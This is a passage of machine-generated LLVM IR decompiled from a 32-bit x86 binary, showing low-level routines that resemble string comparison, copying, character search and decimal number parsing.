  %v1_80512d1 = icmp eq i1 %v3_80512cf, false
  br i1 %v1_80512d1, label %dec_label_pc_80512df, label %dec_label_pc_80512d3

dec_label_pc_80512d3:                             ; preds = %dec_label_pc_80512c0
  %v1_80512d3 = and i32 %v3_80512cc, 2176
  %v2_80512d3 = icmp eq i32 %v1_80512d3, 0
  %v1_80512d8 = icmp eq i1 %v2_80512d3, false
  br i1 %v1_80512d8, label %dec_label_pc_80512e6, label %dec_label_pc_80512da

dec_label_pc_80512da:                             ; preds = %dec_label_pc_80512d3
  %v2_80512da = or i32 %v3_80512cc, %arg2
  %v1_80512dc = trunc i32 %v2_80512da to i16
  store i16 %v1_80512dc, i16* %arg1, align 2
  %v0_80512df.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80512df

dec_label_pc_80512df:                             ; preds = %dec_label_pc_80512c0, %dec_label_pc_80512da
  %v0_8051305 = phi i32 [ %v4_80512c4, %dec_label_pc_80512c0 ], [ %v0_80512df.pre, %dec_label_pc_80512da ]
  %v1_80512df = inttoptr i32 %v0_8051305 to i16*
  %v2_80512df = load i16, i16* %v1_80512df, align 2
  %v2_80512e2 = and i16 %v2_80512df, 16
  %v3_80512e2 = icmp eq i16 %v2_80512e2, 0
  br i1 %v3_80512e2, label %dec_label_pc_80512fe, label %dec_label_pc_80512e6

dec_label_pc_80512e6:                             ; preds = %dec_label_pc_80512df, %dec_label_pc_80512d3
  %v1_80512e6 = call i32 @function_804b7f4(i32 %v0_80512c0)
  %v1_80512eb = inttoptr i32 %v1_80512e6 to i32*
  store i32 9, i32* %v1_80512eb, align 4
  br label %dec_label_pc_80512f1

dec_label_pc_80512f1:                             ; preds = %dec_label_pc_8051302, %dec_label_pc_80512e6
  %v0_80512f1 = load i32, i32* @ebx, align 4
  %v1_80512f1 = inttoptr i32 %v0_80512f1 to i32*
  %v2_80512f1 = load i32, i32* %v1_80512f1, align 4
  %v1_80512f3 = or i32 %v2_80512f1, 8
  %v1_80512f6 = trunc i32 %v1_80512f3 to i16
  %v3_80512f6 = inttoptr i32 %v0_80512f1 to i16*
  store i16 %v1_80512f6, i16* %v3_80512f6, align 2
  br label %dec_label_pc_805132a

dec_label_pc_80512fe:                             ; preds = %dec_label_pc_80512df
  %v2_80512fe = and i16 %v2_80512df, 64
  %v3_80512fe = icmp eq i16 %v2_80512fe, 0
  br i1 %v3_80512fe, label %dec_label_pc_8051320, label %dec_label_pc_8051302

dec_label_pc_8051302:                             ; preds = %dec_label_pc_80512fe
  %v2_8051306 = call i32 @function_804c010(i32 %v0_8051305)
  %v1_805130e = icmp eq i32 %v2_8051306, 0
  %v1_8051310 = icmp eq i1 %v1_805130e, false
  br i1 %v1_8051310, label %dec_label_pc_80512f1, label %dec_label_pc_8051312

dec_label_pc_8051312:                             ; preds = %dec_label_pc_8051302
  %v0_8051312 = load i32, i32* @ebx, align 4
  %v1_8051312 = add i32 %v0_8051312, 8
  %v2_8051312 = inttoptr i32 %v1_8051312 to i32*
  %v3_8051312 = load i32, i32* %v2_8051312, align 4
  %v2_8051315 = add i32 %v0_8051312, 28
  %v3_8051315 = inttoptr i32 %v2_8051315 to i32*
  store i32 %v3_8051312, i32* %v3_8051315, align 4
  %v0_8051318 = load i32, i32* @ebx, align 4
  %v1_8051318 = inttoptr i32 %v0_8051318 to i32*
  %v2_8051318 = load i32, i32* %v1_8051318, align 4
  %v2_8051318.tr = trunc i32 %v2_8051318 to i16
  %v1_805131d = and i16 %v2_8051318.tr, -65
  %v3_805131d = inttoptr i32 %v0_8051318 to i16*
  store i16 %v1_805131d, i16* %v3_805131d, align 2
  %v0_8051320.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051320

dec_label_pc_8051320:                             ; preds = %dec_label_pc_80512fe, %dec_label_pc_8051312
  %v2_8051325 = phi i32 [ %v0_8051305, %dec_label_pc_80512fe ], [ %v0_8051320.pre, %dec_label_pc_8051312 ]
  %v1_8051320 = inttoptr i32 %v2_8051325 to i32*
  %v2_8051320 = load i32, i32* %v1_8051320, align 4
  %v1_8051322 = or i32 %v2_8051320, 1
  %v1_8051325 = trunc i32 %v1_8051322 to i16
  %v3_8051325 = inttoptr i32 %v2_8051325 to i16*
  store i16 %v1_8051325, i16* %v3_8051325, align 2
  br label %dec_label_pc_805132a

dec_label_pc_805132a:                             ; preds = %dec_label_pc_80512f1, %dec_label_pc_8051320
  %storemerge = phi i32 [ 0, %dec_label_pc_8051320 ], [ -1, %dec_label_pc_80512f1 ]
  %v2_805132a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805132a, i32* @edx, align 4
  store i32 %v0_80512c0, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_80512cc, { 0, 2, 1 }
  uselistorder i32 %v0_80512c0, { 1, 0 }
  uselistorder i32 (i32)* @function_804c010, { 6, 3, 2, 1, 8, 7, 5, 4, 0 }
  uselistorder i16 0, { 0, 7, 2, 1, 8, 5, 9, 6, 10, 11, 12, 3, 4 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805132a, { 1, 0 }
  uselistorder label %dec_label_pc_8051320, { 1, 0 }
  uselistorder label %dec_label_pc_80512df, { 1, 0 }
}

define i32 @function_8051330(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051330:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_805133c = add i32 %tmp5, 4
  %v2_805133c = inttoptr i32 %v1_805133c to i32*
  %v3_805133c = load i32, i32* %v2_805133c, align 4
  %v2_805133f = load i32, i32* %arg2, align 4
  %v1_8051345 = add i32 %arg1, 4
  %v2_8051345 = inttoptr i32 %v1_8051345 to i32*
  %v3_8051345 = load i32, i32* %v2_8051345, align 4
  %v4_8051348 = call i32 @function_8051f50(i32 %v3_8051345, i32 %v2_805133f, i32 %v3_805133c, i32 %arg3)
  %v0_8051350 = load i32, i32* @edx, align 4
  %v2_8051350 = icmp slt i32 %v0_8051350, 0
  store i32 %v4_8051348, i32* %ecx.global-to-local, align 4
  br i1 %v2_8051350, label %dec_label_pc_805135d, label %dec_label_pc_8051356

dec_label_pc_8051356:                             ; preds = %dec_label_pc_8051330
  %v1_8051356 = load i32, i32* @ebx, align 4
  %v2_8051356 = inttoptr i32 %v1_8051356 to i32*
  store i32 %v4_8051348, i32* %v2_8051356, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_805135a = load i32, i32* @edx, align 4
  %v1_805135a = load i32, i32* @ebx, align 4
  %v2_805135a = add i32 %v1_805135a, 4
  %v3_805135a = inttoptr i32 %v2_805135a to i32*
  store i32 %v0_805135a, i32* %v3_805135a, align 4
  %v0_805135e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805135d

dec_label_pc_805135d:                             ; preds = %dec_label_pc_8051330, %dec_label_pc_8051356
  %v0_805135e = phi i32 [ %v4_8051348, %dec_label_pc_8051330 ], [ %v0_805135e.pre, %dec_label_pc_8051356 ]
  ret i32 %v0_805135e

; uselistorder directives
  uselistorder i32 %v4_8051348, { 0, 2, 1 }
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_805135d, { 1, 0 }
}

define i32 @function_8051364(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051364:
  %v4_8051366 = ptrtoint i8* %arg1 to i32
  %v4_805136e.pre = load i32, i32* @eax, align 4
  %v8_805136e.pre = load i1, i1* @df, align 1
  %v9_805136e = select i1 %v8_805136e.pre, i32 -1, i32 1
  br label %dec_label_pc_805136e

dec_label_pc_805136e:                             ; preds = %dec_label_pc_8051372, %dec_label_pc_8051364
  %v20_805136f = phi i32 [ %v23_805136f, %dec_label_pc_8051372 ], [ %arg2, %dec_label_pc_8051364 ]
  %v4_805136e = phi i32 [ %v6_805136e, %dec_label_pc_8051372 ], [ %v4_805136e.pre, %dec_label_pc_8051364 ]
  %v7_805136e = phi i32 [ %v10_805136e, %dec_label_pc_8051372 ], [ %v4_8051366, %dec_label_pc_8051364 ]
  %v1_805136e = inttoptr i32 %v7_805136e to i8*
  %v2_805136e = load i8, i8* %v1_805136e, align 1
  %v3_805136f = inttoptr i32 %v20_805136f to i8*
  %v4_805136f = load i8, i8* %v3_805136f, align 1
  %v15_805136f = icmp eq i8 %v2_805136e, %v4_805136f
  %v1_8051370 = icmp eq i1 %v15_805136f, false
  br i1 %v1_8051370, label %dec_label_pc_805137a, label %dec_label_pc_8051372

dec_label_pc_8051372:                             ; preds = %dec_label_pc_805136e
  %v3_805136e = zext i8 %v2_805136e to i32
  %v5_805136e = and i32 %v4_805136e, -256
  %v6_805136e = or i32 %v3_805136e, %v5_805136e
  %v23_805136f = add i32 %v20_805136f, %v9_805136e
  %v10_805136e = add i32 %v7_805136e, %v9_805136e
  %v4_8051372 = icmp eq i8 %v2_805136e, 0
  %v1_8051374 = icmp eq i1 %v4_8051372, false
  br i1 %v1_8051374, label %dec_label_pc_805136e, label %dec_label_pc_805137e

dec_label_pc_805137a:                             ; preds = %dec_label_pc_805136e
  br label %dec_label_pc_805137e

dec_label_pc_805137e:                             ; preds = %dec_label_pc_8051372, %dec_label_pc_805137a
  %storemerge = phi i32 [ 1, %dec_label_pc_805137a ], [ 0, %dec_label_pc_8051372 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805136e, { 1, 2, 0 }
  uselistorder i32 %v9_805136e, { 1, 0 }
  uselistorder label %dec_label_pc_805137e, { 1, 0 }
}

define i32 @function_8051384() local_unnamed_addr {
dec_label_pc_8051384:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051387 = load i32, i32* @esi, align 4
  store i32 %v0_8051387, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_805138b = ptrtoint i8* %tmp5 to i32
  store i32 %v4_805138b, i32* %esi.global-to-local, align 4
  %v4_8051393 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8051397 = call i32 @_strlen(i8* %v4_8051393)
  %v2_8051399 = add i32 %tmp, -1
  store i32 %v2_8051399, i32* %edi.global-to-local, align 4
  %v8_805139d10 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_805139d10, label %dec_label_pc_80513a8, label %dec_label_pc_80513a0.lr.ph

dec_label_pc_80513a0.lr.ph:                       ; preds = %dec_label_pc_8051384
  %v4_80513a0.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_80513a0.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80513a0

dec_label_pc_80513a0:                             ; preds = %dec_label_pc_80513a0.lr.ph, %dec_label_pc_80513a0.dec_label_pc_805139d_crit_edge
  %v8_80513a0 = phi i1 [ %v8_80513a0.pre, %dec_label_pc_80513a0.lr.ph ], [ %v5_80513a1, %dec_label_pc_80513a0.dec_label_pc_805139d_crit_edge ]
  %v4_80513a0 = phi i32 [ %v4_80513a0.pre, %dec_label_pc_80513a0.lr.ph ], [ %v0_80513a2, %dec_label_pc_80513a0.dec_label_pc_805139d_crit_edge ]
  %v2_80513aa12 = phi i32 [ %v2_8051399, %dec_label_pc_80513a0.lr.ph ], [ %v7_80513a1, %dec_label_pc_80513a0.dec_label_pc_805139d_crit_edge ]
  %v0_80513a0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80513a0 = inttoptr i32 %v0_80513a0 to i8*
  %v2_80513a0 = load i8, i8* %v1_80513a0, align 1
  %v3_80513a0 = zext i8 %v2_80513a0 to i32
  %v5_80513a0 = and i32 %v4_80513a0, -256
  %v6_80513a0 = or i32 %v5_80513a0, %v3_80513a0
  store i32 %v6_80513a0, i32* %eax.global-to-local, align 4
  %v9_80513a0 = select i1 %v8_80513a0, i32 -1, i32 1
  %v10_80513a0 = add i32 %v9_80513a0, %v0_80513a0
  store i32 %v10_80513a0, i32* %esi.global-to-local, align 4
  %v3_80513a1 = inttoptr i32 %v2_80513aa12 to i8*
  store i8 %v2_80513a0, i8* %v3_80513a1, align 1
  %v4_80513a1 = load i32, i32* %edi.global-to-local, align 4
  %v5_80513a1 = load i1, i1* @df, align 1
  %v6_80513a1 = select i1 %v5_80513a1, i32 -1, i32 1
  %v7_80513a1 = add i32 %v6_80513a1, %v4_80513a1
  store i32 %v7_80513a1, i32* %edi.global-to-local, align 4
  %v0_80513a2 = load i32, i32* %eax.global-to-local, align 4
  %v3_80513a2 = trunc i32 %v0_80513a2 to i8
  %v4_80513a2 = icmp eq i8 %v3_80513a2, 0
  %v1_80513a4 = icmp eq i1 %v4_80513a2, false
  br i1 %v1_80513a4, label %dec_label_pc_80513a0.dec_label_pc_805139d_crit_edge, label %dec_label_pc_80513ab

dec_label_pc_80513a0.dec_label_pc_805139d_crit_edge: ; preds = %dec_label_pc_80513a0
  %v0_805139d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805139d = add i32 %v0_805139d.pre, -1
  %v8_805139d = icmp eq i32 %v1_805139d, 0
  store i32 %v1_805139d, i32* %ecx.global-to-local, align 4
  br i1 %v8_805139d, label %dec_label_pc_80513a8, label %dec_label_pc_80513a0

dec_label_pc_80513a8:                             ; preds = %dec_label_pc_80513a0.dec_label_pc_805139d_crit_edge, %dec_label_pc_8051384
  %v2_80513aa.lcssa = phi i32 [ %v2_8051399, %dec_label_pc_8051384 ], [ %v7_80513a1, %dec_label_pc_80513a0.dec_label_pc_805139d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80513aa = inttoptr i32 %v2_80513aa.lcssa to i8*
  store i8 0, i8* %v3_80513aa, align 1
  %v4_80513aa = load i32, i32* %edi.global-to-local, align 4
  %v5_80513aa = load i1, i1* @df, align 1
  %v6_80513aa = select i1 %v5_80513aa, i32 -1, i32 1
  %v7_80513aa = add i32 %v6_80513aa, %v4_80513aa
  store i32 %v7_80513aa, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80513ab

dec_label_pc_80513ab:                             ; preds = %dec_label_pc_80513a0, %dec_label_pc_80513a8
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_80513af = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80513af, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_805139d, { 1, 0 }
  uselistorder i32 %v0_80513a2, { 1, 0 }
  uselistorder i32 %v7_80513a1, { 0, 2, 1 }
  uselistorder i1 %v5_80513a1, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80513ab, { 1, 0 }
  uselistorder label %dec_label_pc_80513a0, { 1, 0 }
}

define i32 @function_80513b4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80513b4:
  %v0_80513b5 = load i32, i32* @ebx, align 4
  %v4_80513b6 = urem i32 %arg2, 256
  %v4_80513ba = ptrtoint i8* %arg1 to i32
  %v2_80513c53 = urem i32 %v4_80513ba, 4
  %v3_80513c54 = icmp eq i32 %v2_80513c53, 0
  %v1_80513c78 = icmp eq i1 %v3_80513c54, false
  %v4_80513c0 = trunc i32 %arg2 to i8
  br i1 %v1_80513c78, label %dec_label_pc_80513c0, label %dec_label_pc_80513c9

dec_label_pc_80513c0:                             ; preds = %dec_label_pc_80513b4, %dec_label_pc_80513c4
  %v0_80513c4 = phi i32 [ %v1_80513c4, %dec_label_pc_80513c4 ], [ %v4_80513ba, %dec_label_pc_80513b4 ]
  %v1_80513c0 = inttoptr i32 %v0_80513c4 to i8*
  %v2_80513c0 = load i8, i8* %v1_80513c0, align 1
  %v15_80513c0 = icmp eq i8 %v2_80513c0, %v4_80513c0
  br i1 %v15_80513c0, label %dec_label_pc_8051414, label %dec_label_pc_80513c4

dec_label_pc_80513c4:                             ; preds = %dec_label_pc_80513c0
  %v1_80513c4 = add i32 %v0_80513c4, 1
  %v2_80513c5 = urem i32 %v1_80513c4, 4
  %v3_80513c5 = icmp eq i32 %v2_80513c5, 0
  %v1_80513c7 = icmp eq i1 %v3_80513c5, false
  br i1 %v1_80513c7, label %dec_label_pc_80513c0, label %dec_label_pc_80513c9

dec_label_pc_80513c9:                             ; preds = %dec_label_pc_80513b4, %dec_label_pc_80513c4
  %v0_80513cc = phi i32 [ %v1_80513c4, %dec_label_pc_80513c4 ], [ %v4_80513ba, %dec_label_pc_80513b4 ]
  %v2_80513d0 = mul nuw nsw i32 %v4_80513b6, 256
  %v2_80513d3 = or i32 %v2_80513d0, %v4_80513b6
  %v2_80513d7 = mul i32 %v2_80513d3, 65536
  %v2_80513da = or i32 %v2_80513d7, %v2_80513d3
  br label %dec_label_pc_80513dc

dec_label_pc_80513dc:                             ; preds = %dec_label_pc_805140c, %dec_label_pc_80513dc, %dec_label_pc_80513c9
  %v0_80513e0 = phi i32 [ %v0_80513cc, %dec_label_pc_80513c9 ], [ %v1_80513e0, %dec_label_pc_80513dc ], [ %v1_80513e0, %dec_label_pc_805140c ]
  %v2_80513de = inttoptr i32 %v0_80513e0 to i32*
  %v3_80513de = load i32, i32* %v2_80513de, align 4
  %v4_80513de = xor i32 %v3_80513de, %v2_80513da
  %v1_80513e0 = add i32 %v0_80513e0, 4
  %v1_80513e3 = add i32 %v4_80513de, 2130640639
  %v1_80513e9 = sub i32 -1, %v4_80513de
  %v2_80513eb = xor i32 %v1_80513e3, %v1_80513e9
  %v1_80513ed = and i32 %v2_80513eb, -2130640640
  %v2_80513ed = icmp eq i32 %v1_80513ed, 0
  br i1 %v2_80513ed, label %dec_label_pc_80513dc, label %dec_label_pc_80513f4

dec_label_pc_80513f4:                             ; preds = %dec_label_pc_80513dc
  %v2_80513f4 = inttoptr i32 %v0_80513e0 to i8*
  %v3_80513f4 = load i8, i8* %v2_80513f4, align 1
  %v16_80513f4 = icmp eq i8 %v3_80513f4, %v4_80513c0
  br i1 %v16_80513f4, label %dec_label_pc_8051414, label %dec_label_pc_80513fc

dec_label_pc_80513fc:                             ; preds = %dec_label_pc_80513f4
  %v1_80513fc = add i32 %v0_80513e0, 1
  %v2_80513fc = inttoptr i32 %v1_80513fc to i8*
  %v3_80513fc = load i8, i8* %v2_80513fc, align 1
  %v16_80513fc = icmp eq i8 %v3_80513fc, %v4_80513c0
  br i1 %v16_80513fc, label %dec_label_pc_8051414, label %dec_label_pc_8051404

dec_label_pc_8051404:                             ; preds = %dec_label_pc_80513fc
  %v1_8051404 = add i32 %v0_80513e0, 2
  %v2_8051404 = inttoptr i32 %v1_8051404 to i8*
  %v3_8051404 = load i8, i8* %v2_8051404, align 1
  %v16_8051404 = icmp eq i8 %v3_8051404, %v4_80513c0
  br i1 %v16_8051404, label %dec_label_pc_8051414, label %dec_label_pc_805140c

dec_label_pc_805140c:                             ; preds = %dec_label_pc_8051404
  %v1_805140c = add i32 %v0_80513e0, 3
  %v2_805140c = inttoptr i32 %v1_805140c to i8*
  %v3_805140c = load i8, i8* %v2_805140c, align 1
  %v16_805140c = icmp eq i8 %v3_805140c, %v4_80513c0
  %v1_8051412 = icmp eq i1 %v16_805140c, false
  br i1 %v1_8051412, label %dec_label_pc_80513dc, label %dec_label_pc_8051414

dec_label_pc_8051414:                             ; preds = %dec_label_pc_80513c0, %dec_label_pc_805140c, %dec_label_pc_8051404, %dec_label_pc_80513fc, %dec_label_pc_80513f4
  %v0_8051416 = phi i32 [ %v1_805140c, %dec_label_pc_805140c ], [ %v1_8051404, %dec_label_pc_8051404 ], [ %v1_80513fc, %dec_label_pc_80513fc ], [ %v0_80513e0, %dec_label_pc_80513f4 ], [ %v0_80513c4, %dec_label_pc_80513c0 ]
  store i32 %v0_80513b5, i32* @ebx, align 4
  ret i32 %v0_8051416

; uselistorder directives
  uselistorder i32 %v1_80513e0, { 1, 0 }
  uselistorder i32 %v2_80513d3, { 1, 0 }
  uselistorder i32 %v1_80513c4, { 1, 0, 2 }
  uselistorder i8 %v4_80513c0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_80513ba, { 2, 1, 0 }
  uselistorder i32 %v4_80513b6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051414, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_80513c9, { 1, 0 }
  uselistorder label %dec_label_pc_80513c0, { 1, 0 }
}

define i32 @function_8051418(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051418:
  %v2_805143a31 = load i8, i8* %arg1, align 1
  %v4_805143c35 = icmp eq i8 %v2_805143a31, 0
  br i1 %v4_805143c35, label %dec_label_pc_8051444, label %dec_label_pc_8051440.lr.ph

dec_label_pc_8051440.lr.ph:                       ; preds = %dec_label_pc_8051418
  %v3_805143a32 = zext i8 %v2_805143a31 to i32
  %v4_805143a.pre = load i32, i32* @eax, align 4
  %v5_805143a33 = and i32 %v4_805143a.pre, -256
  %v6_805143a34 = or i32 %v3_805143a32, %v5_805143a33
  %v4_8051421 = ptrtoint i8* %arg1 to i32
  %v1_805142c18 = inttoptr i32 %arg2 to i8*
  %v4_805142c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051440

dec_label_pc_8051427:                             ; preds = %dec_label_pc_8051440, %dec_label_pc_805142b
  %v6_805142c28 = phi i32 [ %v6_805142c, %dec_label_pc_805142b ], [ %v6_805142c22, %dec_label_pc_8051440 ]
  %v2_805142c27 = phi i8 [ %v2_805142c, %dec_label_pc_805142b ], [ %v2_805142c19, %dec_label_pc_8051440 ]
  %v0_805142b26 = phi i32 [ %v1_805142b, %dec_label_pc_805142b ], [ %arg2, %dec_label_pc_8051440 ]
  %v15_8051427 = icmp eq i8 %v2_805143a39, %v2_805142c27
  br i1 %v15_8051427, label %dec_label_pc_8051434, label %dec_label_pc_805142b

dec_label_pc_805142b:                             ; preds = %dec_label_pc_8051427
  %v1_805142b = add i32 %v0_805142b26, 1
  store i32 %v1_805142b, i32* @edx, align 4
  %v1_805142c = inttoptr i32 %v1_805142b to i8*
  %v2_805142c = load i8, i8* %v1_805142c, align 1
  %v3_805142c = zext i8 %v2_805142c to i32
  %v5_805142c = and i32 %v6_805142c28, -256
  %v6_805142c = or i32 %v3_805142c, %v5_805142c
  store i32 %v6_805142c, i32* @ecx, align 4
  %v4_805142e = icmp eq i8 %v2_805142c, 0
  %v1_8051430 = icmp eq i1 %v4_805142e, false
  br i1 %v1_8051430, label %dec_label_pc_8051427, label %dec_label_pc_8051444

dec_label_pc_8051434:                             ; preds = %dec_label_pc_8051427
  %v1_8051438 = add i32 %v0_805144537, 1
  %v1_8051439 = add i32 %v0_805143938, 1
  %v1_805143a = inttoptr i32 %v1_8051439 to i8*
  %v2_805143a = load i8, i8* %v1_805143a, align 1
  %v3_805143a = zext i8 %v2_805143a to i32
  %v5_805143a = and i32 %v6_805143a40, -256
  %v6_805143a = or i32 %v3_805143a, %v5_805143a
  %v4_805143c = icmp eq i8 %v2_805143a, 0
  br i1 %v4_805143c, label %dec_label_pc_8051444, label %dec_label_pc_8051440

dec_label_pc_8051440:                             ; preds = %dec_label_pc_8051440.lr.ph, %dec_label_pc_8051434
  %v4_805142c.pre = phi i32 [ %v4_805142c.pre.pre, %dec_label_pc_8051440.lr.ph ], [ %v6_805142c28, %dec_label_pc_8051434 ]
  %v6_805143a40 = phi i32 [ %v6_805143a34, %dec_label_pc_8051440.lr.ph ], [ %v6_805143a, %dec_label_pc_8051434 ]
  %v2_805143a39 = phi i8 [ %v2_805143a31, %dec_label_pc_8051440.lr.ph ], [ %v2_805143a, %dec_label_pc_8051434 ]
  %v0_805143938 = phi i32 [ %v4_8051421, %dec_label_pc_8051440.lr.ph ], [ %v1_8051439, %dec_label_pc_8051434 ]
  %v0_805144537 = phi i32 [ 0, %dec_label_pc_8051440.lr.ph ], [ %v1_8051438, %dec_label_pc_8051434 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805142c19 = load i8, i8* %v1_805142c18, align 1
  %v3_805142c20 = zext i8 %v2_805142c19 to i32
  %v5_805142c21 = and i32 %v4_805142c.pre, -256
  %v6_805142c22 = or i32 %v3_805142c20, %v5_805142c21
  store i32 %v6_805142c22, i32* @ecx, align 4
  %v4_805142e23 = icmp eq i8 %v2_805142c19, 0
  %v1_805143025 = icmp eq i1 %v4_805142e23, false
  br i1 %v1_805143025, label %dec_label_pc_8051427, label %dec_label_pc_8051444

dec_label_pc_8051444:                             ; preds = %dec_label_pc_8051418, %dec_label_pc_8051434, %dec_label_pc_8051440, %dec_label_pc_805142b
  %v0_805144517 = phi i32 [ %v0_805144537, %dec_label_pc_805142b ], [ %v0_805144537, %dec_label_pc_8051440 ], [ 0, %dec_label_pc_8051418 ], [ %v1_8051438, %dec_label_pc_8051434 ]
  ret i32 %v0_805144517

; uselistorder directives
  uselistorder i32 %v6_805142c22, { 1, 0 }
  uselistorder i8 %v2_805142c19, { 1, 2, 0 }
  uselistorder i32 %v1_8051439, { 1, 0 }
  uselistorder i32 %v6_805142c, { 1, 0 }
  uselistorder i8 %v2_805142c, { 1, 2, 0 }
  uselistorder i32 %v1_805142b, { 2, 1, 0 }
  uselistorder i8 %v2_805143a31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051444, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8051440, { 1, 0 }
}

define i32 @function_805144c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805144c:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8051452 = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8051455 = load i32, i32* @ebx, align 4
  store i32 %v0_8051455, i32* %stack_var_-16, align 4
  %v0_8051456 = load i32, i32* @eax, align 4
  store i32 %v0_8051456, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8051458 = ptrtoint i32* %stack_var_-44 to i32
  %v2_805145b = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805145b, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80514a315 = inttoptr i32 %v0_8051456 to i8*
  %v2_80514a316 = load i8, i8* %v1_80514a315, align 1
  %v3_80514a317 = sext i8 %v2_80514a316 to i32
  store i32 %v3_80514a317, i32* @ecx, align 4
  %v1_80514a618 = add i32 %v0_8051456, 1
  store i32 %v1_80514a618, i32* %ebx.global-to-local, align 4
  %v1_80514a719 = icmp eq i8 %v2_80514a316, 0
  store i1 %v1_80514a719, i1* %zf.global-to-local, align 1
  %v1_80514a921 = icmp eq i1 %v1_80514a719, false
  br i1 %v1_80514a921, label %dec_label_pc_8051466, label %dec_label_pc_80514ab

dec_label_pc_8051466:                             ; preds = %dec_label_pc_805144c, %dec_label_pc_80514a3.backedge
  %v3_80514a323 = phi i32 [ %v3_80514a3, %dec_label_pc_80514a3.backedge ], [ %v3_80514a317, %dec_label_pc_805144c ]
  %v2_80514a322 = phi i8 [ %v2_80514a3, %dec_label_pc_80514a3.backedge ], [ %v2_80514a316, %dec_label_pc_805144c ]
  %v1_8051466 = add nsw i32 %v3_80514a323, -48
  store i32 %v1_8051466, i32* @eax, align 4
  %v9_8051469 = icmp eq i8 %v2_80514a322, 57
  store i1 %v9_8051469, i1* %zf.global-to-local, align 1
  %v6_805146c = icmp ugt i32 %v1_8051466, 9
  br i1 %v6_805146c, label %dec_label_pc_805148f, label %dec_label_pc_805146e

dec_label_pc_805146e:                             ; preds = %dec_label_pc_8051466
  %v0_805146e = load i32, i32* @esi, align 4
  %v1_805146e = inttoptr i32 %v0_805146e to i8*
  %v2_805146e = load i8, i8* %v1_805146e, align 1
  %v2_8051471 = zext i8 %v2_805146e to i32
  %v3_8051471 = mul nuw nsw i32 %v2_8051471, 10
  %v3_8051474 = add nsw i32 %v3_8051471, %v1_8051466
  store i32 %v3_8051474, i32* @eax, align 4
  %v9_8051478 = icmp eq i32 %v3_8051474, 255
  store i1 %v9_8051478, i1* %zf.global-to-local, align 1
  %v6_805147d = icmp ugt i32 %v3_8051474, 255
  br i1 %v6_805147d, label %dec_label_pc_80514c8, label %dec_label_pc_805147f

dec_label_pc_805147f:                             ; preds = %dec_label_pc_805146e
  %v0_805147f = load i32, i32* @edx, align 4
  %v1_805147f = icmp eq i32 %v0_805147f, 0
  store i1 %v1_805147f, i1* %zf.global-to-local, align 1
  %v1_8051481 = trunc i32 %v3_8051474 to i8
  store i8 %v1_8051481, i8* %v1_805146e, align 1
  %v0_8051483 = load i1, i1* %zf.global-to-local, align 1
  %v1_8051483 = icmp eq i1 %v0_8051483, false
